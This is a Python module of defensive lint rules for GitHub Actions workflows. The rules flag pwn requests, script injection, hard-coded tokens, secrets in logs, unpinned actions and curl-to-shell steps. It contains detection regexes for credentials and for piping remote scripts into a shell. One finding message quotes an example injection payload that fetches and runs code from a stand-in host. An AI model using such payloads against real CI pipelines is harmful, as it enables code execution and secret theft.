"""Static rules for GitHub Actions workflows.

Each rule has a stable ID, a severity, a category, a remediation and a public
reference, so a finding in a CI log is actionable on its own. Rules only read
YAML: nothing is executed and no network call is made.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterable
from dataclasses import dataclass

from .workflow import Job, Step, Workflow

SEVERITIES = ("critical", "high", "medium", "low")
SEV_RANK = {s: i for i, s in enumerate(reversed(SEVERITIES))}  # low=0 … critical=3
GITHUB_OWNERS = {"actions", "github"}
SHA_RE = re.compile(r"^[0-9a-f]{40}$")
EXPR_RE = re.compile(r"\$\{\{\s*(.*?)\s*\}\}")
# Contexts an outside contributor controls (PR title/body, branch names, comments, commit messages …).
UNTRUSTED_RE = re.compile(
    r"^(github\.head_ref"
    r"|github\.event\.(?!repository\b)[\w.\[\]'\"*-]*\."
    r"(title|body|message|name|email|label|ref|head_ref|head_branch|page_name|display_title|default_branch))$"
)
SECRET_PATTERNS = [
    (re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "AWS access key ID"),
    (re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36}\b"), "GitHub token"),
    (re.compile(r"\bgithub_pat_[A-Za-z0-9_]{40,}\b"), "GitHub fine-grained token"),
    (re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"), "Slack token"),
    (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "private key"),
]
CURL_PIPE_RE = re.compile(r"\b(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(ba|z|)sh\b")
QUALITY_GATE_RE = re.compile(
    r"\b(test|tests|pytest|jest|vitest|lint|eslint|ruff|audit|scan|trivy|grype|codeql|gitleaks|semgrep|snyk|"
    r"checkov|tfsec|hadolint|bandit)\b",
    re.I,
)
# Major versions that run on a retired Node runtime or a retired backend.
DEPRECATED_MAJORS = {
    "actions/checkout": 4,
    "actions/setup-node": 4,
    "actions/setup-python": 5,
    "actions/setup-java": 4,
    "actions/cache": 4,
    "actions/upload-artifact": 4,
    "actions/download-artifact": 4,
}
ARCHIVED_ACTIONS = {
    "actions/create-release": "softprops/action-gh-release or `gh release create`",
    "actions/upload-release-asset": "`gh release upload`",
}
PR_TRIGGERS = ("pull_request", "pull_request_target")
# Jobs that legitimately need the full history (versioning, changelogs, secret scanning of past commits).
HISTORY_RE = (
    r"\bgit\s+(describe|log|tag|rev-list|blame)\b|semantic-release|changelog|gitversion|gitleaks|trufflehog|sonar"
)


@dataclass(frozen=True)
class Rule:
    id: str
    title: str
    severity: str
    category: str  # security | supply-chain | reliability | performance
    remediation: str
    reference: str
    autofix: bool = False


Hit = tuple[int, str | None, str | None, str]  # line, job id, step label, detail
RULES: dict[str, Rule] = {}
_CHECKS: list[tuple[str, Callable[[Workflow], Iterable[Hit]]]] = []


def rule(id: str, title: str, severity: str, category: str, remediation: str, reference: str, autofix: bool = False):
    assert severity in SEVERITIES and id not in RULES
    RULES[id] = Rule(id, title, severity, category, remediation, reference, autofix)

    def deco(fn: Callable[[Workflow], Iterable[Hit]]):
        _CHECKS.append((id, fn))
        return fn

    return deco


# ---------------------------------------------------------------- helpers


def steps(wf: Workflow) -> Iterable[tuple[Job, Step]]:
    for job in wf.jobs:
        for step in job.steps:
            yield job, step


def line_of(wf: Workflow, start: int, needle: str) -> int:
    """First line at or after `start` (1-based) containing `needle`; falls back to `start`."""
    for i, text in enumerate(wf.lines[max(start - 1, 0) :], start=max(start, 1)):
        if needle in text:
            return i
    return start


def untrusted_exprs(text: str) -> list[str]:
    return [m.group(1) for m in EXPR_RE.finditer(text or "") if UNTRUSTED_RE.match(m.group(1).strip())]


def is_self_hosted(job: Job) -> bool:
    labels = [x.lower() for x in job.runner_labels]
    return "self-hosted" in labels or any(x.startswith("group:") for x in labels)


def major(ref: str | None) -> int | None:
    m = re.match(r"^v?(\d+)", ref or "")
    return int(m.group(1)) if m else None


def job_text(job: Job) -> str:
    return "\n".join(s.run or "" for s in job.steps)


def mask(value: str) -> str:
    return value[:4] + "…" + "*" * 6 if len(value) > 8 else "****"


# ---------------------------------------------------------------- security


@rule(
    "PPG-SEC-001",
    "pull_request_target checks out untrusted PR code (“pwn request”)",
    "critical",
    "security",
    "Use `on: pull_request` for building PR code. If you need pull_request_target, never check out "
    "`github.event.pull_request.head.*`; split into an unprivileged build and a privileged workflow_run.",
    "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
)
def _pwn_request(wf: Workflow):
    if not wf.has_trigger("pull_request_target", "workflow_run"):
        return
    for job, step in steps(wf):
        if step.action != "actions/checkout":
            continue
        ref = str(step.with_.get("ref", ""))
        if re.search(r"pull_request\.head|head_ref|refs/pull/|workflow_run\.head", ref):
            trig = "pull_request_target" if wf.has_trigger("pull_request_target") else "workflow_run"
            yield (
                line_of(wf, step.line, "ref"),
                job.id,
                step.label,
                f"`{trig}` runs with repository secrets and a write token, and this step checks out `{ref}` — "
                "code from the fork then runs with those privileges.",
            )


@rule(
    "PPG-SEC-002",
    "Script injection: untrusted input expanded inside a shell script",
    "high",
    "security",
    "Pass the value through an environment variable (`env: TITLE: ${{ github.event.pull_request.title }}`) "
    'and reference it as "$TITLE" in the script.',
    "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections",
    autofix=True,
)
def _injection(wf: Workflow):
    for job, step in steps(wf):
        sources = [step.run or ""]
        if step.action == "actions/github-script":
            sources.append(str(step.with_.get("script", "")))
        for src in sources:
            for expr in dict.fromkeys(untrusted_exprs(src)):
                yield (
                    line_of(wf, step.line, expr),
                    job.id,
                    step.label,
                    f"`${{{{ {expr} }}}}` is pasted into the script before it runs; a value like "
                    '`"; curl evil.sh | sh #` becomes code.',
                )


@rule(
    "PPG-SEC-003",
    "Hard-coded credential in workflow file",
    "critical",
    "security",
    "Revoke the credential now, store it as an encrypted secret (or use OIDC for cloud access) and "
    "reference it as `${{ secrets.NAME }}`.",
    "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
)
def _hardcoded(wf: Workflow):
    for i, text in enumerate(wf.lines, start=1):
        if text.lstrip().startswith("#"):
            continue
        for rx, kind in SECRET_PATTERNS:
            m = rx.search(text)
            if m:
                yield i, None, None, f"Possible {kind} (`{mask(m.group(0))}`) committed in plain text."


@rule(
    "PPG-SEC-004",
    "Secret printed to the log",
    "high",
    "security",
    "Never echo secrets. GitHub masks exact matches only — transformed values (base64, substrings) leak. "
    "Write them to a file with restricted permissions or pass them via env to the tool that needs them.",
    "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-secrets",
)
def _secret_echo(wf: Workflow):
    rx = re.compile(r"\b(echo|printf|cat)\b[^\n]*\$\{\{\s*secrets\.")
    for job, step in steps(wf):
        for line in (step.run or "").splitlines():
            if rx.search(line):
                yield line_of(wf, step.line, line.strip()), job.id, step.label, f"`{line.strip()[:90]}`"


@rule(
    "PPG-SEC-005",
    "GITHUB_TOKEN granted write-all",
    "high",
    "security",
    "Declare the minimum: `permissions: { contents: read }` at the top, and grant extra scopes "
    "(e.g. `packages: write`) only on the job that needs them.",
    "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token",
)
def _write_all(wf: Workflow):
    if wf.permissions == "write-all":
        yield line_of(wf, 1, "write-all"), None, None, "Top-level `permissions: write-all` gives every job every scope."
    for job in wf.jobs:
        if job.permissions == "write-all":
            yield line_of(wf, job.line, "write-all"), job.id, None, f"Job `{job.id}` requests `write-all`."


@rule(
    "PPG-SEC-006",
    "No explicit token permissions",
    "medium",
    "security",
    "Add `permissions: contents: read` at the top of the workflow. Without it the token gets the repository "
    "default, which is read/write on many older repos and organisations.",
    "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token",
    autofix=True,
)
def _no_permissions(wf: Workflow):
    if wf.permissions is not None:
        return
    missing = [j.id for j in wf.jobs if j.permissions is None and not j.uses]
    if missing:
        yield (
            1,
            None,
            None,
            f"No top-level `permissions:` and {len(missing)} job(s) without their own: {', '.join(missing)}.",
        )


@rule(
    "PPG-SEC-007",
    "Self-hosted runner exposed to pull requests",
    "high",
    "security",
    "Run PR builds on GitHub-hosted runners. If self-hosted is required, use ephemeral runners (one job "
    "per VM) and require approval for fork PRs.",
    "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security",
)
def _self_hosted(wf: Workflow):
    if not wf.has_trigger(*PR_TRIGGERS):
        return
    for job in wf.jobs:
        if is_self_hosted(job):
            yield (
                line_of(wf, job.line, "runs-on"),
                job.id,
                None,
                f"Job `{job.id}` runs on `{', '.join(job.runner_labels)}` for pull requests — a fork can run code "
                "on your machine and persist on it.",
            )


@rule(
    "PPG-SEC-008",
    "Remote script piped straight into a shell",
    "high",
    "security",
    "Download to a file, verify a checksum or signature, then execute — or use a pinned action/package.",
    "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
)
def _curl_pipe(wf: Workflow):
    for job, step in steps(wf):
        for line in (step.run or "").splitlines():
            if CURL_PIPE_RE.search(line):
                yield line_of(wf, step.line, line.strip()), job.id, step.label, f"`{line.strip()[:90]}`"


@rule(
    "PPG-SEC-009",
    "Insecure workflow commands enabled (set-env / add-path)",
    "high",
    "security",
    'Remove ACTIONS_ALLOW_UNSECURE_COMMANDS and write to files instead: `echo "KEY=value" >> "$GITHUB_ENV"`, '
    '`echo "/dir" >> "$GITHUB_PATH"`.',
    "https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/",
)
def _unsecure_commands(wf: Workflow):
    for i, text in enumerate(wf.lines, start=1):
        if re.search(r"ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*['\"]?true", text, re.I):
            yield i, None, None, "`ACTIONS_ALLOW_UNSECURE_COMMANDS: true` lets any log line set env vars and PATH."
        elif re.search(r"::(set-env|add-path)\b", text):
            yield i, None, None, f"`{text.strip()[:80]}` uses a disabled command."


@rule(
    "PPG-SEC-010",
    "Checkout leaves the token in .git/config",
    "low",
    "security",
    "Set `persist-credentials: false` on actions/checkout unless a later step pushes with git.",
    "https://github.com/actions/checkout#usage",
    autofix=True,
)
def _persist_credentials(wf: Workflow):
    for job in wf.jobs:
        pushes = re.search(r"\bgit\s+push\b", job_text(job))
        for step in job.steps:
            if step.action == "actions/checkout" and not pushes:
                if str(step.with_.get("persist-credentials", "true")).lower() != "false":
                    yield (
                        step.line,
                        job.id,
                        step.label,
                        "Any later step (or compromised action) can read the token from disk.",
                    )


@rule(
    "PPG-SEC-011",
    "Reusable workflow receives every secret (`secrets: inherit`)",
    "medium",
    "security",
    "Pass only the secrets the called workflow needs: `secrets: { NPM_TOKEN: ${{ secrets.NPM_TOKEN }} }`.",
    "https://docs.github.com/en/actions/sharing-automations/reusing-workflows#passing-inputs-and-secrets-to-a-reusable-workflow",
)
def _secrets_inherit(wf: Workflow):
    for job in wf.jobs:
        if job.uses and job.secrets == "inherit":
            yield line_of(wf, job.line, "inherit"), job.id, None, f"`{job.uses}` gets all repository secrets."


# ---------------------------------------------------------------- supply chain


@rule(
    "PPG-SUP-001",
    "Third-party action not pinned to a commit SHA",
    "high",
    "supply-chain",
    "Pin to the full 40-character commit SHA and keep the tag as a comment: "
    "`uses: owner/action@<sha> # v1.2.3`. Let Dependabot bump it.",
    "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
)
def _third_party_unpinned(wf: Workflow):
    for job, step in steps(wf):
        if step.action and step.action.split("/")[0] not in GITHUB_OWNERS and not SHA_RE.match(step.ref or ""):
            yield (
                step.line,
                job.id,
                step.label,
                f"`{step.uses}` — a tag can be moved to malicious code at any time "
                "(this is how tj-actions/changed-files leaked secrets in March 2025).",
            )
    for job in wf.jobs:
        if job.uses and not job.uses.startswith("./"):
            owner = job.uses.split("/")[0].lower()
            ref = job.uses.split("@", 1)[1] if "@" in job.uses else ""
            if owner not in GITHUB_OWNERS and not SHA_RE.match(ref):
                yield line_of(wf, job.line, "uses"), job.id, None, f"Reusable workflow `{job.uses}` is not SHA-pinned."


@rule(
    "PPG-SUP-002",
    "GitHub-owned action referenced by tag or branch",
    "low",
    "supply-chain",
    "Tags of actions/* are maintained by GitHub and lower risk, but SHA pinning gives reproducible builds. "
    "Never use a branch (`@main`).",
    "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
)
def _first_party_tag(wf: Workflow):
    for job, step in steps(wf):
        if step.action and step.action.split("/")[0] in GITHUB_OWNERS and not SHA_RE.match(step.ref or ""):
            if step.ref in ("main", "master", None):
                yield step.line, job.id, step.label, f"`{step.uses}` follows a moving branch."
            else:
                yield step.line, job.id, step.label, f"`{step.uses}` uses a tag, not a commit SHA."


@rule(
    "PPG-SUP-003",
    "Container image without a fixed version",
    "medium",
    "supply-chain",
    "Use an explicit version tag, ideally with a digest: `image: postgres:17.2@sha256:…`.",
    "https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier",
)
def _mutable_image(wf: Workflow):
    def bad(image: str) -> bool:
        if "@sha256:" in image or "${{" in image:
            return False
        name = image.rsplit("/", 1)[-1]
        return ":" not in name or name.endswith(":latest")

    for job in wf.jobs:
        images = []
        if isinstance(job.container, str):
            images.append(("container", job.container))
        elif isinstance(job.container, dict) and job.container.get("image"):
            images.append(("container", str(job.container["image"])))
        for svc, spec in job.services.items():
            if isinstance(spec, dict) and spec.get("image"):
                images.append((f"service `{svc}`", str(spec["image"])))
        for where, image in images:
            if bad(image):
                yield (
                    line_of(wf, job.line, image),
                    job.id,
                    None,
                    f"{where} uses `{image}` — the build changes when upstream pushes.",
                )
        for step in job.steps:
            if step.uses and step.uses.startswith("docker://") and bad(step.uses[9:]):
                yield step.line, job.id, step.label, f"`{step.uses}` is mutable."


@rule(
    "PPG-SUP-004",
    "Archived / unmaintained action",
    "medium",
    "supply-chain",
    "Replace with a maintained alternative; archived actions get no security fixes.",
    "https://github.com/actions/create-release",
)
def _archived(wf: Workflow):
    for job, step in steps(wf):
        if step.action in ARCHIVED_ACTIONS:
            yield step.line, job.id, step.label, f"`{step.action}` is archived — use {ARCHIVED_ACTIONS[step.action]}."


# ---------------------------------------------------------------- reliability


@rule(
    "PPG-REL-001",
    "Deprecated action major version",
    "medium",
    "reliability",
    "Upgrade to the current major. These versions run on a retired Node.js runtime or a retired artifact/cache "
    "backend and break without warning.",
    "https://github.blog/changelog/2024-04-16-deprecation-notice-v3-of-the-artifact-actions/",
    autofix=True,
)
def _deprecated(wf: Workflow):
    for job, step in steps(wf):
        want = DEPRECATED_MAJORS.get(step.action or "")
        have = major(step.ref)
        if want and have is not None and have < want and not SHA_RE.match(step.ref or ""):
            yield step.line, job.id, step.label, f"`{step.uses}` → upgrade to `@v{want}`."


@rule(
    "PPG-REL-002",
    "Deprecated set-output / save-state command",
    "medium",
    "reliability",
    'Write to the environment files: `echo "name=value" >> "$GITHUB_OUTPUT"` (or `$GITHUB_STATE`).',
    "https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/",
    autofix=True,
)
def _set_output(wf: Workflow):
    for job, step in steps(wf):
        for line in (step.run or "").splitlines():
            if re.search(r"::(set-output|save-state)\s", line):
                yield line_of(wf, step.line, line.strip()), job.id, step.label, f"`{line.strip()[:80]}`"


@rule(
    "PPG-REL-003",
    "Quality gate can never fail (continue-on-error)",
    "medium",
    "reliability",
    "Remove `continue-on-error: true` from tests and security scans, or upload the result and fail on a threshold.",
    "https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idstepscontinue-on-error",
)
def _continue_on_error(wf: Workflow):
    for job, step in steps(wf):
        if str(step.continue_on_error).lower() == "true":
            if QUALITY_GATE_RE.search(f"{step.name or ''} {step.uses or ''} {step.run or ''}"):
                yield (
                    line_of(wf, step.line, "continue-on-error"),
                    job.id,
                    step.label,
                    "A failing check here is silently ignored.",
                )
    for job in wf.jobs:
        if str(job.raw.get("continue-on-error")).lower() == "true" and QUALITY_GATE_RE.search(
            f"{job.id} {job.name or ''}"
        ):
            yield line_of(wf, job.line, "continue-on-error"), job.id, None, f"Job `{job.id}` can never fail the run."


@rule(
    "PPG-REL-004",
    "`npm install` in CI instead of `npm ci`",
    "medium",
    "reliability",
    "Use `npm ci`: it installs exactly what package-lock.json says, fails on drift and is faster.",
    "https://docs.npmjs.com/cli/v11/commands/npm-ci",
    autofix=True,
)
def _npm_install(wf: Workflow):
    rx = re.compile(r"\bnpm\s+(install|i)\s*($|&&|;|\|)")
    for job, step in steps(wf):
        for line in (step.run or "").splitlines():
            if rx.search(line):
                yield line_of(wf, step.line, line.strip()), job.id, step.label, f"`{line.strip()[:80]}`"


# ---------------------------------------------------------------- performance / cost


def cache_target(job: Job, step: Step) -> str | None:
    """The `cache:` value setup-* should get, or None when caching is not relevant / already on."""
    if step.with_.get("cache") or any(s.action == "actions/cache" for s in job.steps):
        return None
    text = job_text(job)
    if step.action == "actions/setup-node":
        if re.search(r"\bpnpm\s+(install|i)\b", text):
            return "pnpm"
        if re.search(r"\byarn(\s+install)?\s*($|&&|;)", text, re.M):
            return "yarn"
        if re.search(r"\bnpm\s+(ci|install|i)\b", text):
            return "npm"
    if step.action == "actions/setup-python" and re.search(r"\bpip3?\s+install\b", text):
        return "pip"
    if step.action == "actions/setup-java":
        if re.search(r"\bgradlew?\b", text):
            return "gradle"
        if re.search(r"\bmvnw?\b", text):
            return "maven"
    return None


@rule(
    "PPG-PERF-001",
    "Dependencies downloaded from scratch on every run",
    "medium",
    "performance",
    "Turn on the built-in cache of the setup action (`cache: npm` / `pip` / `maven`) or add actions/cache.",
    "https://github.com/actions/setup-node#caching-global-packages-data",
    autofix=True,
)
def _no_cache(wf: Workflow):
    for job, step in steps(wf):
        target = cache_target(job, step)
        if target:
            yield (
                step.line,
                job.id,
                step.label,
                f"`{step.action}` installs {target} packages without `cache: {target}`.",
            )


@rule(
    "PPG-PERF-002",
    "Job has no timeout (defaults to 6 hours)",
    "low",
    "performance",
    "Set `timeout-minutes` slightly above the job's normal duration so a hung step fails fast instead of "
    "burning up to 360 runner minutes.",
    "https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idtimeout-minutes",
    autofix=True,
)
def _no_timeout(wf: Workflow):
    for job in wf.jobs:
        if not job.uses and job.timeout_minutes is None:
            yield job.line, job.id, None, f"Job `{job.id}` can run for 360 minutes if a step hangs."


@rule(
    "PPG-PERF-003",
    "Superseded runs are not cancelled",
    "low",
    "performance",
    "Add a concurrency group so a new push cancels the old run of the same branch/PR.",
    "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs",
    autofix=True,
)
def _no_concurrency(wf: Workflow):
    if (
        wf.concurrency is None
        and wf.has_trigger("push", "pull_request")
        and not any(j.raw.get("concurrency") for j in wf.jobs)
    ):
        yield 1, None, None, "Pushing 3 commits quickly runs the whole pipeline 3 times."


@rule(
    "PPG-PERF-004",
    "Full git history cloned (fetch-depth: 0)",
    "low",
    "performance",
    "Keep the default shallow clone unless the job needs tags/history (versioning, changelogs, blame).",
    "https://github.com/actions/checkout#fetch-all-history-for-all-tags-and-branches",
)
def _fetch_depth(wf: Workflow):
    for job, step in steps(wf):
        if step.action == "actions/checkout" and str(step.with_.get("fetch-depth", "1")) == "0":
            history_users = job_text(job) + " " + " ".join(s.uses or "" for s in job.steps)
            if not re.search(HISTORY_RE, history_users, re.I):
                yield (
                    line_of(wf, step.line, "fetch-depth"),
                    job.id,
                    step.label,
                    "Whole history downloaded but nothing in the job reads it.",
                )


@rule(
    "PPG-PERF-005",
    "Expensive runner type",
    "low",
    "performance",
    "On private repos macOS minutes are billed at 10× and Windows at 2× Linux. Run on ubuntu unless the job "
    "really needs that OS, and keep macOS matrices small.",
    "https://docs.github.com/en/billing/managing-billing-for-your-products/managing-billing-for-github-actions/about-billing-for-github-actions#minute-multipliers",
)
def _expensive_runner(wf: Workflow):
    for job in wf.jobs:
        text = " ".join(job.runner_labels) + " " + str(job.strategy.get("matrix", ""))
        os_hits = sorted({m.group(1) for m in re.finditer(r"\b(macos|windows)-[\w.-]+", text)})
        if os_hits:
            yield line_of(wf, job.line, "runs-on"), job.id, None, f"Job `{job.id}` uses {', '.join(os_hits)} runners."


def evaluate(wf: Workflow) -> list[dict]:
    out = []
    for rule_id, check in _CHECKS:
        r = RULES[rule_id]
        seen = set()
        for line, job_id, step_label, detail in check(wf):
            key = (line, detail)
            if key in seen:
                continue
            seen.add(key)
            out.append(
                {
                    "rule_id": r.id,
                    "title": r.title,
                    "severity": r.severity,
                    "category": r.category,
                    "file": wf.path,
                    "line": line,
                    "job": job_id,
                    "step": step_label,
                    "detail": detail,
                    "remediation": r.remediation,
                    "reference": r.reference,
                    "autofix": r.autofix,
                }
            )
    out.sort(key=lambda f: (-SEV_RANK[f["severity"]], f["line"], f["rule_id"]))
    return out
